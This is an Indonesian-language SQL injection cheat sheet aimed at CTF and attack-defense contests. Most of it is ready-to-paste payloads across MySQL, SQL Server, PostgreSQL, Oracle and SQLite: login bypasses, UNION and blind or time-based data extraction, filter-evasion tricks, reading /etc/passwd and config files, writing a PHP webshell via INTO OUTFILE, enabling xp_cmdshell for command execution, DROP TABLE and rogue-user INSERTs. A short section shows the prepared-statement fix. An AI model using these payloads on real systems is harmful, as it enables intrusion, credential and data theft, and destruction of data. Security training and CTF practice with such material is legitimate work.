# SQL Injection Cheat Sheet

> Referensi: Invicti SQL Injection Cheat Sheet (adapted for CTF/AD)  
> **Legend:** M=MySQL | S=SQL Server | P=PostgreSQL | O=Oracle | L=SQLite

---

## Kapan Dipakai

- Form login, search box, parameter URL (`?id=1`)
- POST body (API/JSON juga bisa kalau masuk query SQL)
- Header (User-Agent, Cookie) — jarang tapi possible

**Cek cepat apakah injectable:**

```
?id=5-1          → harus sama dengan ?id=4
?id=4 OR 1=1     → beda response = possible SQLi
?id=4'            → error SQL = confirmed
```

---

## 1. Comments (Manipulasi Query)

### Line Comments

```sql
-- (SMPOL)   -- comment sampai akhir baris
# (M)       -- comment MySQL only

admin'--
admin'#
' OR 1=1--
```

**Contoh login bypass:**
```sql
-- Query asli:
SELECT * FROM members WHERE username = 'INPUT' AND password = 'pass'

-- Input: admin'--
SELECT * FROM members WHERE username = 'admin'--' AND password = 'pass'
```

### Inline Comments

```sql
/*comment*/           -- (SMPOL)
DR/**/OP/**/table     -- bypass filter keyword
SELECT/**/password/**/FROM/**/Members

/*!80027 code */      -- (M) MySQL version-specific, executes only on MySQL ≥8.0.27
```

---

## 2. Stacked Queries

```sql
; (MSP) — jalankan query kedua setelah query pertama

10; DROP TABLE members--
SELECT * FROM products WHERE id = 10; DROP members--
```

> Hasil query ke-2 tidak ditampilkan ke app — perlu blind/time-based confirm.

---

## 3. IF Statements (Blind SQLi)

| DB | Syntax |
|----|--------|
| **MySQL (M)** | `IF(condition, true-part, false-part)` |
| **SQL Server (S)** | `IF (1=1) SELECT 'true' ELSE SELECT 'false'` |
| **PostgreSQL (P)** | `SELECT CASE WHEN (1=1) THEN 'A' ELSE 'B' END` |
| **Oracle (O)** | `BEGIN IF (1=1) THEN ...; END IF; END;` |
| **SQLite (L)** | `iif(1<2, "True", "False")` |

**Sample:**
```sql
if ((select user) = 'sa') select 1 else select 1/0   -- (S) error = bukan sa
IF(ASCII(SUBSTRING(user(),1,1))>100, SLEEP(5), 0)    -- (M) blind
```

---

## 4. Login Bypass

```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
" or 1=1--
" or "1"="1--
```

### Bypass MD5 Hash Check (MSP)

```
Username: admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password: 1234
-- 81dc9bdb52d04dc20036dbd8313ed055 = MD5('1234')
```

### UNION Login as Different User

```
' UNION SELECT 1, 'anotheruser', 'any string', 1--
```

---

## 5. UNION Injection

**Langkah standar:**

```
1. Tentukan jumlah kolom:
   ' ORDER BY 1-- 
   ' ORDER BY 2--
   ... sampai error

2. Tentukan kolom yang visible:
   ' UNION SELECT 1,2,3--

3. Extract data:
   ' UNION SELECT 1,username,password FROM users--
   ' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--
```

**Tips:**
- Pakai `UNION ALL` (bukan `UNION`) — hindari distinct filter
- Pakai `NULL` kalau belum tahu tipe kolom
- Pakai `-1` atau ID tidak ada di awal: `' AND 1=0 UNION SELECT ...`

### Cari Jumlah Kolom (ORDER BY)

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
... error di N = ada N-1 kolom
```

### Cari Tipe Kolom

```sql
' UNION SELECT sum(col) FROM users--          -- (S) error = bukan numeric
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,'2',NULL,NULL--
' UNION SELECT 1,'2',3,NULL--
```

### Cari Nama Kolom (Error-based, S)

```
' HAVING 1=1 --
' GROUP BY table.col1 HAVING 1=1 --
' GROUP BY table.col1, col2 HAVING 1=1 --
... tambah kolom sampai tidak error
```

---

## 6. Database Enumeration

### MySQL (M) — PALING SERING DI CTF PHP

```sql
-- Versi
SELECT @@version
SELECT VERSION()

-- Database saat ini
SELECT database()

-- List database
SELECT schema_name FROM information_schema.schemata

-- List tabel
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT table_name FROM information_schema.tables WHERE table_schema='dbname'

-- List kolom
SELECT column_name FROM information_schema.columns WHERE table_name='users'
SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database()

-- Dump data
UNION SELECT 1,username,password FROM users--
UNION SELECT 1,flag,NULL FROM flags--
```

### SQL Server (S)

```sql
SELECT @@version
SELECT name FROM sysobjects WHERE xtype='U'
SELECT TOP 1 name FROM sys.objects WHERE type='U'
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='tablename')
```

### PostgreSQL (P)

```sql
SELECT version()
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### Oracle (O)

```sql
SELECT * FROM all_tables WHERE OWNER='DATABASE_NAME'
SELECT * FROM all_col_comments WHERE TABLE_NAME='TABLE'
SELECT version FROM PRODUCT_COMPONENT_VERSION WHERE product LIKE 'Oracle Database%'
```

### SQLite (L)

```sql
SELECT sqlite_version()
UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE type='table'
```

---

## 7. Blind SQL Injection

### Boolean-based

```sql
' AND 1=1--     → response normal
' AND 1=2--     → response beda = blind confirmed

' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>70--
```

### Time-based (Totally Blind)

| DB | Payload |
|----|---------|
| **MySQL (M)** | `' AND SLEEP(5)--` atau `BENCHMARK(1000000,MD5(1))` |
| **SQL Server (S)** | `'; WAITFOR DELAY '0:0:5'--` |
| **PostgreSQL (P)** | `'; SELECT pg_sleep(5)--` |
| **Oracle (O)** | `dbms_pipe.receive_message('x',5)` |

**MySQL samples:**
```sql
' OR IF(1=1,SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1))>70,SLEEP(5),0)--
IF EXISTS(SELECT * FROM users WHERE username='admin') BENCHMARK(1000000,MD5(1))
```

**SQL Server samples:**
```sql
1; WAITFOR DELAY '0:0:10'--
1'; WAITFOR DELAY '0:0:10'--
if (select user)='sa' WAITFOR DELAY '0:0:10'
```

---

## 8. String Operations (Bypass Quote Filter)

### Concatenation

```sql
+ (S)                    SELECT login + '-' + password FROM members
|| (MO+)                 SELECT login || '-' || password FROM members
CONCAT(a,b,c) (M)        SELECT CONCAT(login,password) FROM members
```

### Tanpa Quote

```sql
SELECT CHAR(75)+CHAR(76)+CHAR(77)     -- (S) = KLM
SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))  -- (M) = KLM
SELECT 0x457578                        -- (M) hex to string
SELECT CHR(64)                         -- (P)
```

### Hex Encoding

```sql
SELECT LOAD_FILE(0x633A5C626F6F742E696E69)   -- (M) read c:\boot.ini
SELECT CONCAT('0x',HEX('c:\\boot.ini'))       -- (M) generate hex
' OR 0x61646D696E=0x61646D696E --
```

---

## 9. File Read/Write (MySQL — sering di CTF)

```sql
-- Baca file
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
UNION SELECT 1,LOAD_FILE('/flag.txt'),3--
UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3--

-- Tulis webshell (butuh FILE privilege + writable path)
UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/shell.php'--

-- Dump ke file
SELECT ... INTO DUMPFILE '/tmp/out.txt'
```

**LOAD DATA INFILE:**
```sql
CREATE TABLE foo(line blob);
LOAD DATA INFILE '/etc/passwd' INTO TABLE foo;
SELECT * FROM foo;
```

---

## 10. Command Execution via SQLi

### SQL Server xp_cmdshell (S)

```sql
EXEC master.dbo.xp_cmdshell 'whoami'
EXEC master.dbo.xp_cmdshell 'type C:\flag.txt'

-- Enable (butuh admin):
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

### MySQL UDF (M, jarang)

```sql
SELECT sys_exec('id');   -- butuh UDF terinstall
```

---

## 11. INSERT Injection

```sql
'; INSERT INTO users VALUES(1,'hax0r','coolpass',9)--   (MSO+)
'; INSERT INTO users(username,password) VALUES('admin2','pass')--
```

---

## 12. Second-Order SQLi

Payload disimpan dulu (register/profile), baru dieksekusi di query lain.

```
Register name: ' + (SELECT TOP 1 password FROM users) + '
→ Disimpan ke DB → dipakai unsafely di query/stored procedure lain
```

---

## 13. Filter Bypass Tricks

```
' OR '1'='1
' OR 1=1#
admin'/*
' UnIoN SeLeCt 1,2,3--        -- case variation
' %55nion %53elect 1,2,3--   -- URL encode
' /*!50000UNION*/ SELECT 1,2,3--  -- MySQL comment bypass
' OR 1=1 LIMIT 1--%20         -- whitespace bypass
```

---

## 14. Patch Cepat (Defense — PHP)

```php
// IDEAL
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
$stmt->execute([$id]);

// QUICK (mepet)
$id = intval($_GET['id']);                              // angka
$user = mysqli_real_escape_string($conn, $_POST['u']);  // string
```

```php
// JANGAN
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "SELECT * FROM users WHERE username = '" . $_POST['user'] . "'";
```

---

## 15. Payload CTF — Copy Paste

### Deteksi

```
'
"
' OR '1'='1
" OR "1"="1
1' ORDER BY 1--
1' ORDER BY 999--
```

### Extract Flag (MySQL)

```
' UNION SELECT 1,flag,3 FROM flags--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flags'--
' UNION SELECT 1,group_concat(flag),3 FROM flags--
```

### Blind Extract 1 Char

```
' AND SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F'--
' AND IF(SUBSTRING((SELECT flag FROM flags LIMIT 1),1,1)='F',SLEEP(3),0)--
```

---

## Useful Functions Reference

| Function | DB | Fungsi |
|----------|-----|--------|
| `ASCII()` | SMPO | ASCII char pertama |
| `SUBSTRING()` / `SUBSTR()` | SMPO | Potong string |
| `SLEEP()` | M | Delay detik |
| `BENCHMARK()` | M | CPU delay |
| `WAITFOR DELAY` | S | Delay |
| `pg_sleep()` | P | Delay |
| `GROUP_CONCAT()` | M | Gabung kolom jadi 1 string |
| `LOAD_FILE()` | M | Baca file |
| `INTO OUTFILE` | M | Tulis file |
| `@@version` | MS | Versi DB |
| `information_schema` | M | Metadata DB |

---

*Untuk authorized security testing & CTF only.*
